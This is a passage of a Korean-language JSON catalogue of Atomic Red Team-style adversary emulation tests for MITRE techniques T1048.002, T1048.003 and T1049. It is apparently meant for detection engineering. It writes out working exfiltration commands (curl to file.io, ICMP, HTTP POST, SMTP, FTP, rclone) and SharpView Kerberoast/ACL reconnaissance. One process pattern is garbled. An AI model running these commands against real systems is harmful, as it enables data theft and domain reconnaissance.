        "없으면 입력 파일 경로의 상위 디렉터리를 생성한 후, GitHub에서 artifact 파일을 다운로드해 #{input_file} 위치에 저장한다.",
        "명령 프롬프트(cmd.exe)에서 #{curl_path} -k -F \"file=@#{input_file}\" https://file.io/ 명령을 실행해 HTTPS를 통해 file.io에 파일을 업로드한다.",
        "성공 시 file.io에서 반환하는 JSON 응답(다운로드 링크 등)이 stdout으로 표시된다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "#{curl_path} -k -F \"file=@#{input_file}\" https://file.io/"
        }
      ],

      "prerequisites": [
        "PowerShell 실행이 가능해야 하며, Invoke-WebRequest, Expand-Archive, Copy-Item cmdlet을 사용할 수 있어야 한다.",
        "curl.exe가 #{curl_path} 경로에 존재해야 하며, 없을 경우 외부 인터넷에 접속해 curl.zip을 다운로드할 수 있어야 한다.",
        "테스트용 입력 파일 #{input_file}이 존재해야 하며, 없을 경우 GitHub에서 artifact 파일을 내려받을 수 있어야 한다.",
        "인터넷을 통해 https://file.io/ 로의 아웃바운드 HTTPS 통신이 허용되어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip",
            "description": "curl 공식 사이트에서 다운로드한 Windows용 curl 압축 파일"
          },
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-8.4.0_6-win64-mingw\\bin\\curl.exe",
            "description": "압축 해제된 curl 실행 파일(원본 위치)"
          },
          {
            "path": "C:\\Windows\\System32\\Curl.exe",
            "description": "시스템 PATH 상에 복사된 curl 실행 파일(테스트 및 이후 사용에 활용)"
          },
          {
            "path": "PathToAtomicsFolder\\T1048.002\\src\\artifact",
            "description": "GitHub에서 다운로드한 테스트용 아티팩트 파일(업로드 대상 데이터)"
          }
        ],
        "files_read": [
          {
            "path": "#{input_file}",
            "description": "curl이 HTTPS POST 업로드를 위해 읽어들이는 테스트 파일(artifact)"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "curl 및 테스트 입력 파일 존재 여부 확인, curl.zip 다운로드 및 압축 해제, artifact 파일 다운로드를 수행하는 PowerShell 프로세스",
            "commandline_pattern": "Invoke-WebRequest *curl-8.4.0_6-win64-mingw.zip*; Expand-Archive *curl.zip*; Copy-Item *curl.exe* C:\\Windows\\System32\\Curl.exe; Invoke-WebRequest *T1048.002/src/artifact* -OutFile *"
          },
          {
            "name": "curl.exe",
            "description": "HTTPS를 통해 file.io로 테스트 파일을 업로드하는 프로세스",
            "commandline_pattern": "Curl.exe -k -F \"file=@*\" https://file.io/"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "curl 공식 사이트에서 Windows용 curl.zip 파일을 다운로드하는 아웃바운드 트래픽",
            "destination_pattern": "curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip"
          },
          {
            "protocol": "HTTPS",
            "description": "GitHub에서 테스트용 artifact 파일을 다운로드하는 트래픽",
            "destination_pattern": "github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact"
          },
          {
            "protocol": "HTTPS",
            "description": "curl이 file.io로 테스트 파일을 업로드하는 POST 요청 트래픽",
            "destination_pattern": "file.io"
          }
        ]
      },

      "cleanup": [
        "테스트 후 C:\\Windows\\System32\\Curl.exe가 실환경에 필요 없으면 삭제해 원 상태로 되돌릴 수 있다.",
        "PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip 및 curl 폴더, artifact 파일을 삭제해 테스트용 파일 흔적을 제거할 수 있다.",
        "file.io에 업로드된 데이터는 서비스 측에서 일정 기간 후 자동 삭제되거나, 대시보드/링크를 통해 수동 삭제할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0"
      }
    }
  ]
},
{
  "technique_id": "T1048.003",
  "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
  "tactic": "Exfiltration",
  "description": "공격자가 C2 전용 채널이 아닌 HTTP, ICMP, SMTP, FTP 등 일반 네트워크 프로토콜을 직접 활용해 데이터를 외부로 유출하는 기법이다. 트래픽 자체는 평문이거나 단순 난독화 수준에 불과하지만, 정상 관리·서비스 트래픽처럼 보이기 때문에 탐지 정책이 느슨한 환경에서는 은밀한 데이터 유출 통로가 될 수 있다.",

  "tests": [
    {
      "test_id": "T1048.003-1",
      "name": "Exfiltration Over Alternative Protocol - ICMP",
      "platforms": ["windows"],

      "summary": "PowerShell의 .NET Ping 클래스를 이용해 특정 파일(기본: notepad.exe)을 바이트 단위로 읽어 ICMP 에코 요청 패킷으로 전송하는 시나리오이다. 공격자는 ICMP 트래픽을 수집·복원해 파일 내용을 재구성할 수 있다.",

      "procedure": [
        "대상 파일(기본: C:\\Windows\\System32\\notepad.exe)이 존재하는지 확인한다.",
        "PowerShell을 실행한다.",
        "PowerShell에서 $ping = New-Object System.Net.Networkinformation.ping 객체를 생성한다.",
        "Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024 명령으로 파일을 1024 바이트 단위로 읽는다.",
        "각 청크($Data)에 대해 $ping.Send(\"#{ip_address}\", 1500, $Data) 호출을 수행해 ICMP 에코 요청 패킷의 페이로드로 전송한다.",
        "네트워크 캡처 도구(예: Wireshark)로 #{ip_address}로 향하는 ICMP 트래픽과 페이로드의 분포를 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }"
        }
      ],

      "prerequisites": [
        "입력 파일 #{input_file}가 존재해야 한다(기본: C:\\Windows\\System32\\notepad.exe).",
        "목적지 IP 주소 #{ip_address}(기본: 127.0.0.1)로의 ICMP 에코 요청이 네트워크/방화벽에서 허용되어야 한다.",
        "Windows 환경에서 PowerShell과 .NET System.Net.NetworkInformation.Ping 클래스 사용이 가능해야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "#{input_file}",
            "description": "ICMP 페이로드로 분할·전송되는 원본 파일(기본: notepad.exe)"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "입력 파일을 바이트 단위로 읽어 ICMP Ping 요청을 반복 전송하는 PowerShell 프로세스",
            "commandline_pattern": "New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path * -Encoding Byte -ReadCount 1024) { $ping.Send(\"*\", 1500, $Data) }"
          }
        ],
        "network": [
          {
            "protocol": "ICMP",
            "description": "Ping.Send 메서드를 통해 #{ip_address}로 전송되는 다수의 ICMP 에코 요청(파일 바이트가 페이로드에 포함됨)",
            "destination_pattern": "#{ip_address}"
          }
        ]
      },

      "cleanup": [
        "테스트 자체는 디스크에 새로운 파일을 생성하지 않으므로 별도의 파일 삭제는 필요 없다.",
        "ICMP 로그 또는 네트워크 캡처 파일이 생성되었다면 DFIR 목적에 따라 보존하거나 삭제할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "dd4b4421-2e25-4593-90ae-7021947ad12e"
      }
    },

    {
      "test_id": "T1048.003-2",
      "name": "Exfiltration Over Alternative Protocol - HTTP (PowerShell)",
      "platforms": ["windows"],

      "summary": "PowerShell Invoke-WebRequest를 이용해 HTTP POST 요청으로 파일 내용을 전송하는 시나리오이다. 기본적으로 notepad.exe의 내용을 문자열로 읽어, http://127.0.0.1 엔드포인트로 POST 전송한다.",

      "procedure": [
        "대상 파일(기본: C:\\Windows\\System32\\notepad.exe)의 존재를 확인한다.",
        "PowerShell을 실행한다.",
        "$content = Get-Content #{input_file} 명령으로 파일 내용을 텍스트(줄 단위 문자열)로 읽어온다.",
        "Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content 명령을 실행해 HTTP POST 요청을 전송한다.",
        "서버 측(예: 간단한 HTTP 서버나 프록시 로그)에서 요청 바디에 파일 내용이 포함되어 도착했는지 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$content = Get-Content #{input_file}; Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content"
        }
      ],

      "prerequisites": [
        "입력 파일 #{input_file}가 존재해야 한다(기본: C:\\Windows\\System32\\notepad.exe).",
        "#{ip_address} (기본: http://127.0.0.1) 주소에 대해 HTTP POST 요청을 수신할 수 있는 서버 또는 수집기가 준비되어 있어야 한다.",
        "Windows 환경에서 PowerShell(Invoke-WebRequest cmdlet 포함)을 사용할 수 있어야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "#{input_file}",
            "description": "HTTP POST 요청 바디로 전송되는 파일(기본: notepad.exe, 텍스트로 읽히는 형태)"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Get-Content와 Invoke-WebRequest를 사용해 파일 내용을 HTTP POST로 전송하는 프로세스",
            "commandline_pattern": "$content = Get-Content *; Invoke-WebRequest -Uri * -Method POST -Body $content"
          }
        ],
        "network": [
          {
            "protocol": "HTTP",
            "description": "Invoke-WebRequest가 #{ip_address}로 전송하는 HTTP POST 요청(파일 내용이 HTTP 바디에 포함됨)",
            "destination_pattern": "#{ip_address}"
          }
        ]
      },

      "cleanup": [
        "테스트 자체는 클라이언트 측에 새로운 파일을 생성하지 않으므로 별도의 파일 삭제는 필요 없다.",
        "서버 측에 저장된 로그나 POST 데이터는 필요에 따라 제거할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "6aa58451-1121-4490-a8e9-1dada3f1c68c"
      }
    },

    {
      "test_id": "T1048.003-3",
      "name": "Exfiltration Over Alternative Protocol - SMTP",
      "platforms": ["windows"],

      "summary": "PowerShell Send-MailMessage cmdlet을 이용해 파일을 이메일 첨부 파일로 전송하는 시나리오이다. 기본적으로 notepad.exe를 첨부해 T1048.003 Atomic Test 제목의 메일을 지정한 SMTP 서버를 통해 송신한다.",

      "procedure": [
        "입력 파일(기본: C:\\Windows\\System32\\notepad.exe)이 존재하는지 확인한다.",
        "SMTP 서버 주소 #{smtp_server}와 송수신자 이메일 주소 #{sender}, #{receiver}가 올바르게 설정되어 있는지 확인한다.",
        "PowerShell을 실행한다.",
        "Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server} 명령을 실행한다.",
        "SMTP 서버 또는 수신 메일함에서 첨부 파일이 포함된 메일이 도착했는지 확인해, 파일이 SMTP를 통해 유출되었는지 검증한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server}"
        }
      ],

      "prerequisites": [
        "입력 파일 #{input_file}가 존재해야 한다(기본: C:\\Windows\\System32\\notepad.exe).",
        "SMTP 서버 #{smtp_server}가 메일 릴레이를 허용하고 있으며, #{sender}에서 #{receiver}로의 송신이 허용되어 있어야 한다.",
        "테스트 환경의 방화벽이 #{smtp_server}에 대한 SMTP 포트(일반적으로 25, 587, 465 등) 통신을 허용해야 한다.",
        "Windows 환경에서 PowerShell Send-MailMessage cmdlet 사용이 가능해야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "#{input_file}",
            "description": "SMTP 이메일에 첨부되어 전송되는 파일(기본: notepad.exe)"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Send-MailMessage를 실행해 첨부 파일을 포함한 이메일을 발송하는 PowerShell 프로세스",
            "commandline_pattern": "Send-MailMessage -From * -To * -Subject \"T1048.003 Atomic Test\" -Attachments * -SmtpServer *"
          }
        ],
        "network": [
          {
            "protocol": "SMTP",
            "description": "SMTP 서버 #{smtp_server}로 전송되는 메일 트래픽(첨부 파일에 유출 대상 데이터 포함)",
            "destination_pattern": "#{smtp_server}:25/587/465"
          }
        ]
      },

      "cleanup": [
        "테스트 후 메일 서버 또는 수신자 메일함에서 테스트용 메일을 삭제해 노출을 줄일 수 있다.",
        "필요하다면 SMTP 로그에서 관련 세션 기록을 별도로 보관하거나 정리할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "ec3a835e-adca-4c7c-88d2-853b69c11bb9"
      }
    },

    {
      "test_id": "T1048.003-4",
      "name": "MAZE FTP Upload",
      "platforms": ["windows"],

      "summary": "MAZE 랜섬웨어에서 관찰된 것과 유사하게, %windir%\\temp 디렉터리 내의 7z 압축 파일들을 FTP 서버로 업로드하는 시나리오이다. WebClient와 FTP를 활용해 이미 압축된 데이터 패키지를 외부로 유출하는 패턴을 재현한다.",

      "procedure": [
        "FTP 서버 #{ftp_server}가 가동 중이며, #{username} / #{password} 계정으로 로그인 가능한지 확인한다.",
        "%windir%\\temp 경로에 *.7z 파일이 존재하는지 확인하거나, 필요 시 테스트용 7z 파일을 생성한다.",
        "PowerShell을 실행한다.",
        "$Dir_to_copy = \"$env:windir\\temp\"를 설정하고, $ftp = \"ftp://#{ftp_server}/\"로 FTP 기본 URL을 구성한다.",
        "New-Object System.Net.WebClient를 생성하고 Credentials에 #{username}, #{password}를 설정한다.",
        "test-connection -count 1 -computername \"#{ftp_server}\" -quiet 명령으로 FTP 서버에 ICMP로 접근 가능한지 확인한다.",
        "연결이 가능하면 dir $Dir_to_copy \"*.7z\"로 7z 파일 목록을 반복하며, 각 파일에 대해 $web_client.UploadFile($uri, $file.FullName)을 호출해 FTP 서버로 업로드한다.",
        "FTP 서버 측에서 업로드된 7z 파일들이 존재하는지 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$Dir_to_copy = \"$env:windir\\temp\"; $ftp = \"ftp://#{ftp_server}/\"; $web_client = New-Object System.Net.WebClient; $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}'); if (test-connection -count 1 -computername \"#{ftp_server}\" -quiet) { foreach($file in (dir $Dir_to_copy \"*.7z\")) { echo \"Uploading $file...\"; $uri = New-Object System.Uri($ftp+$file.name); $web_client.UploadFile($uri, $file.FullName) } } else { echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\" }"
        }
      ],

      "prerequisites": [
        "%windir%\\temp 경로에 하나 이상의 7z 파일이 존재해야 한다(테스트용으로 미리 작성 가능).",
        "FTP 서버 #{ftp_server}가 접근 가능해야 하며, #{username}, #{password} 계정으로 로그인 및 업로드 권한이 있어야 한다.",
        "테스트 환경의 방화벽이 FTP 포트(기본 21 및 PASV 데이터 포트)를 허용해야 한다.",
        "Windows 환경에서 PowerShell과 .NET System.Net.WebClient 사용이 가능해야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "%windir%\\temp\\*.7z",
            "description": "FTP로 업로드 대상이 되는 7z 압축 파일들"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "%windir%\\temp 내 *.7z 파일을 찾고, WebClient.UploadFile을 통해 FTP 서버로 업로드하는 PowerShell 프로세스",
            "commandline_pattern": "$Dir_to_copy = \"$env:windir\\temp\"; $ftp = \"ftp://*\"; $web_client = New-Object System.Net.WebClient; $web_client.UploadFile(*.7z*)"
          }
        ],
        "network": [
          {
            "protocol": "ICMP",
            "description": "test-connection cmdlet이 FTP 서버 #{ftp_server}로 보내는 연결 확인용 ping",
            "destination_pattern": "#{ftp_server}"
          },
          {
            "protocol": "FTP",
            "description": "WebClient.UploadFile를 통해 ftp://#{ftp_server}/ 경로로 업로드되는 7z 파일 전송 트래픽",
            "destination_pattern": "#{ftp_server}:21"
          }
        ]
      },

      "cleanup": [
        "cleanup_command를 실행하면 FTP 서버 측에 업로드된 *.7z 파일을 FTP DeleteFile 요청으로 삭제하려 시도한다.",
        "로컬 %windir%\\temp 디렉터리의 *.7z 파일은 자동 삭제되지 않으므로 필요 시 수동으로 정리해야 한다."
      ],

      "metadata": {
        "atomic_source_id": "57799bc2-ad1e-4130-a793-fb0c385130ba"
      }
    },

    {
      "test_id": "T1048.003-5",
      "name": "Exfiltration Over Alternative Protocol - FTP - Rclone",
      "platforms": ["windows"],

      "summary": "rclone 도구를 활용해 exfil.zip 파일을 외부 FTP 서버로 복사하는 시나리오이다. 사전 단계에서 테스트용 exfil.zip 파일과 rclone 바이너리를 준비한 뒤, rclone config create로 FTP 리모트를 구성하고 rclone copy로 대용량 파일을 업로드한다.",

      "procedure": [
        "PowerShell에서 fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760 명령을 통해 20MB 크기의 더미 exfil.zip 파일을 생성한다(또는 기존 파일이 있으면 그대로 사용).",
        "Invoke-WebRequest로 rclone-current-windows-amd64.zip을 C:\\Users\\Public\\Downloads\\ 경로에 다운로드한다.",
        "Expand-Archive를 사용해 rclone-current-windows-amd64.zip을 C:\\Users\\Public\\Downloads\\에 압축 해제한다.",
        "PowerShell에서 Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\"로 rclone 바이너리의 전체 경로를 찾는다.",
        "Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\"으로 업로드 대상 exfil.zip 파일 경로를 찾는다.",
        "&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass} 명령으로 rclone에 FTP 리모트(ftpserver)를 생성한다.",
        "&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate 명령으로 exfil.zip을 FTP 서버에 업로드한다.",
        "FTP 서버 측에서 exfil.zip 파일이 존재하는지 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName; $exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName; &$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}; &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate"
        }
      ],

      "prerequisites": [
        "C:\\Users\\Public\\Downloads\\exfil.zip 파일이 존재해야 한다. 없을 경우 fsutil file createnew 명령으로 생성할 수 있다.",
        "C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip가 존재해야 하며, 없으면 Invoke-WebRequest를 통해 다운로드 후 Expand-Archive로 압축을 풀어야 한다.",
        "FTP 서버 #{ftp_server}:#{ftp_port}가 접근 가능해야 하며, #{ftp_user} / #{ftp_pass} 계정으로 로그인할 수 있어야 한다.",
        "Windows 환경에서 PowerShell, fsutil, Invoke-WebRequest, Expand-Archive 사용이 가능해야 하고, rclone 실행을 위한 적절한 권한이 필요하다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "C:\\Users\\Public\\Downloads\\exfil.zip",
            "description": "fsutil file createnew로 생성된 더미 exfiltration 패키지(20MB 테스트 파일)"
          },
          {
            "path": "C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip",
            "description": "rclone Windows용 압축 파일"
          },
          {
            "path": "C:\\Users\\Public\\Downloads\\rclone-*\\rclone.exe",
            "description": "압축 해제 후 생성된 rclone 실행 파일(정확한 경로는 버전에 따라 달라질 수 있음)"
          }
        ],
        "files_read": [
          {
            "path": "C:\\Users\\Public\\Downloads\\exfil.zip",
            "description": "rclone이 FTP 서버로 전송하는 exfiltration 대상 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "exfil.zip 및 rclone 압축 파일을 준비하고 rclone 명령을 실행하는 PowerShell 프로세스",
            "commandline_pattern": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip *; Invoke-WebRequest *rclone-current-windows-amd64.zip*; Expand-Archive *rclone-current-windows-amd64.zip*"
          },
          {
            "name": "rclone.exe",
            "description": "FTP 리모트(ftpserver)를 구성하고 exfil.zip 파일을 FTP 서버로 복사하는 rclone 프로세스",
            "commandline_pattern": "rclone* config create ftpserver *; rclone* copy *exfil.zip* ftpserver *"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "rclone-current-windows-amd64.zip을 다운로드하기 위한 HTTP/HTTPS 트래픽",
            "destination_pattern": "downloads.rclone.org/rclone-current-windows-amd64.zip"
          },
          {
            "protocol": "FTP",
            "description": "rclone이 ftpserver 리모트를 통해 exfil.zip을 전송하는 FTP 트래픽",
            "destination_pattern": "#{ftp_server}:#{ftp_port}"
          }
        ]
      },

      "cleanup": [
        "테스트 후 C:\\Users\\Public\\Downloads\\exfil.zip, rclone-current-windows-amd64.zip 및 압축 해제 디렉터리를 삭제해 디스크 흔적을 정리할 수 있다.",
        "rclone config에서 ftpserver 리모트 구성이 남아 있을 수 있으므로, 실제 환경에서는 rclone config delete ftpserver 등을 통해 제거할 수 있다.",
        "FTP 서버 측에 업로드된 exfil.zip 파일은 필요 시 수동으로 삭제해야 한다."
      ],

      "metadata": {
        "atomic_source_id": "b854eb97-bf9b-45ab-a1b5-b94e4880c56b"
      }
    }
  ]
},
{
  "technique_id": "T1049",
  "technique_name": "System Network Connections Discovery",
  "tactic": "Discovery",
  "description": "공격자는 시스템에 설정된 현재 네트워크 연결 상태를 파악해 C2 채널, 측면 이동 경로, 공유 리소스 등을 찾는다. netstat, net use, Get-NetTCPConnection, SharpView 같은 도구를 활용해 포트·세션·도메인 정보까지 수집할 수 있으며, 이후 권한 상승이나 측면 이동에 활용된다.",

  "tests": [
    {
      "test_id": "T1049-1",
      "name": "System Network Connections Discovery (netstat / net use / net sessions)",
      "platforms": ["windows"],

      "summary": "cmd.exe에서 netstat, net use, net sessions 명령을 실행해 시스템의 네트워크 연결, SMB 공유 매핑, 세션 정보를 열람하는 시나리오이다. 단순 명령 기반이지만, 공격자는 이를 통해 활성 연결과 공유 자원을 파악할 수 있다.",

      "procedure": [
        "명령 프롬프트(cmd.exe)를 실행한다.",
        "netstat 명령을 실행해 현재 TCP/UDP 연결 및 리스닝 포트를 확인한다.",
        "net use 명령으로 현재 시스템에 매핑된 네트워크 드라이브 및 공유 연결 목록을 확인한다.",
        "net sessions 명령으로 서버 관점에서 연결된 세션·사용자 정보를 조회한다(일부 환경에서는 관리자 권한 필요).",
        "출력 결과를 캡처해 C2 연결, SMB 공유 등 의심스러운 연결이 있는지 분석한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "netstat\r\nnet use\r\nnet sessions"
        }
      ],

      "prerequisites": [
        "Windows 환경에서 cmd.exe 실행이 가능해야 한다.",
        "일부 시스템에서는 net sessions 실행에 관리자 권한이 필요할 수 있다.",
        "명령어는 로컬에 기본 포함되므로 별도의 추가 파일은 필요 없다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "netstat, net use, net sessions 명령을 순차적으로 실행하는 콘솔 프로세스",
            "commandline_pattern": "cmd.exe /c netstat & net use & net sessions"
          }
        ],
        "network": []
      },

      "cleanup": [
        "해당 테스트는 시스템 설정을 변경하지 않으므로 별도 클린업이 필요하지 않다.",
        "명령 실행 결과를 파일로 저장했다면 해당 로그 파일을 삭제해 흔적을 줄일 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "0940a971-809a-48f1-9c4d-b1d785e96ee5"
      }
    },

    {
      "test_id": "T1049-2",
      "name": "System Network Connections Discovery with PowerShell",
      "platforms": ["windows"],

      "summary": "PowerShell의 Get-NetTCPConnection cmdlet을 사용해 현재 시스템의 TCP 연결(로컬/원격 주소, 포트, 상태 등)을 조회하는 시나리오이다. 포트·상태 기반 필터링과 함께 사용하면 특정 서비스나 C2 연결을 찾는 데 활용될 수 있다.",

      "procedure": [
        "PowerShell 콘솔을 실행한다.",
        "Get-NetTCPConnection 명령을 실행해 모든 TCP 연결 목록을 가져온다.",
        "출력 결과에서 LocalPort, RemotePort, RemoteAddress, State 필드를 기준으로 의심스러운 연결을 식별한다.",
        "필요하다면 | Where-Object, | Select-Object 등을 추가해 특정 포트·프로세스에 대한 상세 정보를 필터링한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-NetTCPConnection"
        }
      ],

      "prerequisites": [
        "Windows PowerShell(또는 PowerShell Core)에서 Get-NetTCPConnection cmdlet이 제공되는 버전이어야 한다(일반적으로 Win8/2012 이후).",
        "네트워크 스택에 대한 기본 조회 권한이 필요하지만 보통 표준 사용자 권한으로도 실행 가능하다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Get-NetTCPConnection을 실행해 TCP 연결 정보를 수집하는 PowerShell 프로세스",
            "commandline_pattern": "powershell.exe *Get-NetTCPConnection*"
          }
        ],
        "network": []
      },

      "cleanup": [
        "테스트는 조회만 수행하므로 별도의 클린업 단계가 필요 없다.",
        "출력 내용을 파일로 리다이렉트하여 저장했다면, 필요한 경우 해당 로그 파일을 삭제할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "f069f0f1-baad-4831-aa2b-eddac4baac4a"
      }
    },

    {
      "test_id": "T1049-3",
      "name": "System Discovery using SharpView",
      "platforms": ["windows"],

      "summary": "SharpView.exe를 이용해 네트워크 연결뿐만 아니라 도메인·도메인 사용자·공유 리소스 등 AD 환경 전반의 정보를 조회하는 시나리오이다. 공격자는 Kerberoasting, ACL 스캐닝, 도메인 공유 탐색 등 후속 공격에 필요한 정보를 한 번에 수집할 수 있다.",

      "procedure": [
        "PowerShell에서 Test-Path \"#{SharpView}\" 명령으로 SharpView.exe가 지정 경로에 존재하는지 확인한다.",
        "존재하지 않으면 (split-path \"#{SharpView}\") 경로에 디렉터리를 생성한 후, Invoke-WebRequest #{SharpView_url} -OutFile \"#{SharpView}\"를 실행해 GitHub에서 SharpView.exe를 다운로드한다.",
        "PowerShell 스크립트 내에서 $syntaxList = #{syntax}로 실행할 메서드 목록(예: \"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\")을 준비한다.",
        "foreach ($syntax in $syntaxList) { #{SharpView} $syntax } 루프를 통해 SharpView.exe를 각 메서드 인자와 함께 실행한다.",
        "콘솔에 출력된 결과를 기반으로 도메인 ACL, Kerberoast 대상 계정, 도메인 공유 등 네트워크·도메인 정보를 분석한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$syntaxList = #{syntax}; foreach ($syntax in $syntaxList) { #{SharpView} $syntax }"
        }
      ],

      "prerequisites": [
        "외부 네트워크(GitHub)에 접근 가능해야 SharpView.exe를 다운로드할 수 있다.",
        "SharpView.exe가 #{SharpView} 경로에 저장되어 있어야 한다(없으면 get_prereq 단계에서 자동 다운로드).",
        "실제 AD/도메인 환경에서 의미 있는 결과를 얻으려면 도메인에 조인된 시스템 및 적절한 도메인 권한이 필요하다.",
        "일부 SharpView 기능(ACL 스캔 등)은 더 높은 권한(도메인 사용자 또는 관리자 권한)을 요구할 수 있다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "#{SharpView}",
            "description": "GitHub에서 다운로드된 SharpView.exe 실행 파일(ExternalPayloads 하위에 보관되는 레드팀 도구)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "SharpView.exe 다운로드(Invoke-WebRequest) 및 SharpView 실행 루프를 제어하는 PowerShell 프로세스",
            "commandline_pattern": "Invoke-WebRequest *SharpView.exe* -OutFile *; $syntaxList = *; foreach ($syntax in $syntaxList) { *SharpView.exe* $syntax }"
          },
          {
            "name": "SharpView.exe",
            "description": "Invoke-ACLScanner, Invoke-Kerberoast, Find-DomainShare 등의 메서드를 통해 도메인/네트워크 정보를 수집하는 .NET 기반 도구",
            "commandline_pattern": "ShwnwkddlwwwwarpView.exe Invoke-* 또는 Find-DomainShare 등 다양한 메서드 인자"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "get_prereq 단계에서 GitHub 저장소에서 SharpView.exe를 다운로드하는 트래픽",
            "destination_pattern": "github.com/tevora-threat/SharpView/*/SharpView.exe?raw=true"
          }
        ]
      },

      "cleanup": [
        "테스트 후 #{SharpView} 파일을 삭제해 SharpView 도구를 제거할 수 있다.",
        "SharpView 실행 결과를 로그 파일로 리다이렉트한 경우, 해당 파일을 정리해 민감한 도메인 정보를 노출되지 않도록 할 수 있다.",
        "프록시·FW 로그 등 네트워크 로그에도 GitHub 및 SharpView 활동 흔적이 남을 수 있으므로, DFIR 목적에 따라 별도 관리가 필요하다."
      ],

      "metadata": {
        "atomic_source_id": "96f974bb-a0da-4d87-a744-ff33e73367e9"
      }
    }
  ]
},
{
  "technique_id": "T1053.002",
  "technique_name": "Scheduled Task/Job: At",
  "tactic": "Execution",
  "description": "레거시 at.exe 명령을 이용해 특정 시점에 명령을 실행하도록 예약하는 기법이다. 공격자는 예약 작업을 통해 사용자가 보지 않는 시간대에 명령 프롬프트나 스크립트를 실행하거나, 간단한 지속성/지연 실행 메커니즘으로 활용할 수 있다. Windows 8 이후에는 deprecated 되었지만, 여전히 호환성 모드나 구형 환경에서 악용 가능성이 존재한다.",

  "tests": [
    {
